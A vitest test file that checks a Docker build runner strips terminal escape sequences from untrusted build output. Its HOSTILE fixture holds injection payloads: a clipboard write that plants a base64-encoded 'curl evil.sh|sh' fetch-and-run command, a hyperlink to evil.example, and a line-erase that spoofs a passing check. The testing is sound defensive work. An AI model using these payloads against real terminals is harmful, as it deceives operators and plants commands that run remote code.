/**
 * Build output is untrusted (a recipe's setup script writes into it): what
 * reaches the operator's terminal and the persisted log must carry no escape
 * sequence or control character a terminal would act on.
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { BuildCancelledError, runDockerBuild, sanitizeBuildOutput } from "./sandbox-image.js";

/** Anything a terminal would act on: C0 (but \n and \t), DEL and C1. */
// eslint-disable-next-line no-control-regex -- finding control characters is the point
const CONTROL = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/;
const HOSTILE = [
  "\u001b]0;pwned title\u0007", // OSC 0: retitle the terminal
  "\u001b]52;c;Y3VybCBldmlsLnNofHNo\u0007", // OSC 52: write the clipboard
  "\u001b]8;;https://evil.example\u001b\\link\u001b]8;;\u001b\\", // OSC 8 hyperlink, ST-terminated
  "half a line\u001b[2K\rverify: ok (gl=software)\n", // erase the line and print a fake one over it
  "\u009b2K\u009d0;c1 title\u009c", // 8-bit CSI and OSC
  "\u001bPdcs payload\u001b\\", // DCS
  "bell\u0007 backspace\u0008 null\u0000 del\u007f\n",
].join("");

describe("build output", () => {
  const dirs: string[] = [];
  afterEach(() => {
    vi.restoreAllMocks();
    for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
  });

  it("is stripped of escape sequences and control characters; a carriage return becomes a line break", () => {
    const clean = sanitizeBuildOutput(HOSTILE);
    expect(clean).not.toMatch(CONTROL);
    expect(clean).not.toContain("pwned title");
    expect(clean).not.toContain("Y3VybCBldmlsLnNofHNo");
    // The fake line can no longer overwrite the real one: it stands on a line of its own, after it.
    expect(clean).toContain("half a line\nverify: ok (gl=software)\n");
    expect(clean).toContain("bell backspace null del\n");
    expect(sanitizeBuildOutput("a\r\nb\rc\td")).toBe("a\nb\nc\td");
    expect(sanitizeBuildOutput("plain Step 1/44 : FROM x — ünïcode ✓\n")).toBe("plain Step 1/44 : FROM x — ünïcode ✓\n");
  });

  it("from a real process: piped and cleaned for the log and the terminal alike, never written raw", async () => {
    const dir = mkdtempSync(join(tmpdir(), "cb-build-output-"));
    dirs.push(dir);
    writeFileSync(join(dir, "payload"), HOSTILE);
    const fake = join(dir, "fake-docker");
    // Writes the payload byte by byte-ish (two chunks, split inside an escape and inside \r\n), on both streams.
    writeFileSync(
      fake,
      `#!/bin/sh\nhead -c 37 "${join(dir, "payload")}"; sleep 0.05; tail -c +38 "${join(dir, "payload")}" >&2; printf 'x\\r'; sleep 0.05; printf '\\ny\\n'\n`,
    );
    chmodSync(fake, 0o755);
    const written: string[] = [];
    vi.spyOn(process.stdout, "write").mockImplementation(((chunk: string) => {
      written.push(String(chunk));
      return true;
    }) as never);
    const logged: string[] = [];
    await runDockerBuild(["build"], { binary: fake, stdio: "inherit", onOutput: (chunk) => logged.push(chunk) });
    vi.restoreAllMocks();
    for (const text of [written.join(""), logged.join("")]) {
      expect(text).not.toMatch(CONTROL);
      expect(text).toContain("verify: ok (gl=software)");
      expect(text).toContain("x\ny\n");
      expect(text).not.toContain("x\n\ny");
    }
  });

  it("a cancelled build rejects once the process has gone", async () => {
    const dir = mkdtempSync(join(tmpdir(), "cb-build-cancel-"));
    dirs.push(dir);
    const fake = join(dir, "slow-docker");
    writeFileSync(fake, "#!/bin/sh\necho starting\nsleep 30\n");
    chmodSync(fake, 0o755);
    const abort = new AbortController();
    const started = Date.now();
    const run = runDockerBuild(["build"], { binary: fake, signal: abort.signal, onOutput: () => abort.abort() });
    await expect(run).rejects.toBeInstanceOf(BuildCancelledError);
    expect(Date.now() - started).toBeLessThan(10_000);
    await expect(runDockerBuild(["build"], { binary: fake, signal: abort.signal })).rejects.toBeInstanceOf(BuildCancelledError);
  });
});
